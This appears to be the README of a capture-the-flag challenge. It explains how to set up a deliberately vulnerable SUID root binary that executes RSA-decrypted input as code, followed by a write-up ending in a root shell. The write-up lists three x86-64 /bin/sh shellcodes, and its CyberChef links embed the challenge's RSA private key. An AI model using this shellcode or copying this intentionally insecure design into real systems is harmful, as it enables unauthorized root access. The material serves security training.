# CTF-Program
## Compiling the program
```c
gcc -o pogram main.c -lssl -lcrypto
```
## Setting up the machine
1) Copy the program
2) Add root as the file owner: ``sudo chown root program``
3) Set the SUID: ``sudo chmod u+s program``
4) Verify that the file is executable: `` ls -l program``

## Write-ups
1) Check the file permission and notice the SUID
2) Download the file
3) Reverse the code via Ghidra
4) Understand
   1) The program modifies the permission of a memory page.
   2) It accepts a single argument, which is provided in Base64 format.
   3) The Base64 argument is decoded and then decrypted using a private RSA key.
   4) The decrypted argument is parsed for further processing.
   5) The program then executes itself with elevated privileges using the SUID bit.
   6) The parsed argument is injected into memory and executed.
5) Run the strings command (or via Ghidra)
   1) Extract the private RSA key
   2) Derive the public key from the private key
6) Find a ShellCode to execute a new shell
   - \x48\x31\xd2\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
   - \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
   - \x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
7) Encrypt the content with the derived public RSA key
8) Transform it in Base64
9) Run the program with that argument
10) New shell created with Root’s permissions

## Tools
- [Encrypt](https://gchq.github.io/CyberChef/#recipe=RSA_Encrypt('-----BEGIN%20PUBLIC%20KEY-----%5CnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1%2Bvz0U6mlNsKMpD6rFf%5CnWx5zH0fPKi8pAmZ9U/MI9eoWbKWXmu%2BZc5zxYPEnwlS8W5DDU/o1TAOyGlLgmPZq%5CnKHMT35p3z8zh7H5oMDkbkpoKVF6KSOaEXrsjy6oi76jNS6cQJLyzetSNIu7Py7O9%5CnDlhz7449ol7crJxVffu1PEcePhBxiLm4Wb9e6L3FCkUQDMqD4JFEnDT5kNLeXzHx%5Cnn1%2BPJFhIQ%2B91M3kicrUIt65hByEpptvVv20WkUTQY/QggtkVE%2BUmIsdNA1SwHMHn%5CnEr8s29RYOji7wRsmyRJ0XpyisNe/xaTMSpZmmXX9rCodgSVCEwz1XcaiXLkhmhiv%5CnbQIDAQAB%5Cn-----END%20PUBLIC%20KEY-----%5Cn','RSAES-PKCS1-V1_5','SHA-1')To_Base64('A-Za-z0-9%2B/%3D'))
- [Decrypt](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)RSA_Decrypt('-----BEGIN%20PRIVATE%20KEY-----%5CnMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC7X6/PRTqaU2wo%5CnykPqsV9bHnMfR88qLykCZn1T8wj16hZspZea75lznPFg8SfCVLxbkMNT%2BjVMA7Ia%5CnUuCY9moocxPfmnfPzOHsfmgwORuSmgpUXopI5oReuyPLqiLvqM1LpxAkvLN61I0i%5Cn7s/Ls70OWHPvjj2iXtysnFV9%2B7U8Rx4%2BEHGIubhZv17ovcUKRRAMyoPgkUScNPmQ%5Cn0t5fMfGfX48kWEhD73UzeSJytQi3rmEHISmm29W/bRaRRNBj9CCC2RUT5SYix00D%5CnVLAcwecSvyzb1Fg6OLvBGybJEnRenKKw17/FpMxKlmaZdf2sKh2BJUITDPVdxqJc%5CnuSGaGK9tAgMBAAECggEAQCTwN0kwWC%2BR2d7wZDJHfhaM%2B5rmKT9OzzMN2YTcPu9d%5CnsOD5ZwF6K1GBcpnr7gN7He%2BPZrrDrxuex5MyrzrAOcu3dHdZZ8pwVzko6sVKEqRo%5CnP9zDg1Ri4Vk4VlsOrbPAYBM3nBP7b2O/U0Ok4EvOP1B5k/tCT0khS3gTblcSgqkR%5Cn9ROiRDclEAdHj3bkzFCWSwpU6by9LlZIQUDeFFusWnhnVEdTQ2GZMrLURkpgiybd%5CnTI9PkqCZwHL824/FsTENAchwkRE3tIwIentP3/51YAH9zP3GsQ%2BKg%2BR4YANY4xtx%5CnTx%2BYkPbju8Cy0CUs/Ou1rzilbihsoKoRzmkgOVepkwKBgQDkMUudHLSenDAIiStk%5Cnvr16i7y%2BuBGA5tYo6OdqEqAA76f4UYhJ84ra7npnwvpwURwPwOnX1yl60aRtRXJf%5CnUqreKyPH73kO95ZDn7ZH%2BlKfIRwZInvy1BIDcXjgNEuRout%2BELG5JurUMIyXtxQY%5CnbZ0e2HKNeS48DpX0QfARJtO3twKBgQDSNQHE7xZmwOqY82O0Snyj3lPQX7lfC1Zg%5CnPr91FXdIag8TXevy2Y9eQ5pG/n/cmc%2B3xor60Yau1GAqkKYL2HKgJ%2BSmn4yv6YV/%5CnL2U2nX41GwY9%2BLZqmqR9v1we%2BEeOo230D9GAIS7ck/dCd/fj%2BgdNdelzhgjXqQRY%5CnUKqgECLp%2BwKBgD2HSTMg1VbbGFyE1%2B1/PMn5ObhXG2kdVOuM%2BTDxurDl7e2X1l7S%5CnS0ODAABQY4S7agyZYLQxMN8L/gD0s8UeHjJvgWNcn9C4U40CWH0J8xMzM0dXtAIi%5CnyoShKQ2TLDklq8e/KpyY8MKsIIyb8dAwZig2BpU88omBCU/mI5wMUxP7AoGAUM8D%5Cn0RtAd1vuU8ItMB/6blyHx/Ekp/8Jw5Ibs/z%2BkB4FkaJnlEJCtTAz3Nr1eG7AxZtT%5CnzjxCFG%2BcUICu9JrO5fawFcX8JZwWL%2BCefjJpVC0BZ013gt/UIGsyFM3JZHI7ULnM%5CnBf%2B7rhxLz4ejCkcSC5sqlbiPKajV/MV18naBlYUCgYAHleNkNeT5pWrGFkGB5HPe%5CndL4sEJX0GuL20EELpoK0%2BF36FmUreu1A6dXVkycr5NGc3nglXYEewQkyJaWCFW%2Bf%5CnNYWAtfyRR8/FWwMhnM1EwZuHB5LjoRcxiIea4CYCEsKj9z78dywybGcw1H7pyCbf%5Cnp4GQUoA2GsoYeZlJywd3WA%3D%3D%5Cn-----END%20PRIVATE%20KEY-----%5Cn','','RSAES-PKCS1-V1_5','SHA-1')To_Hex('Space',0))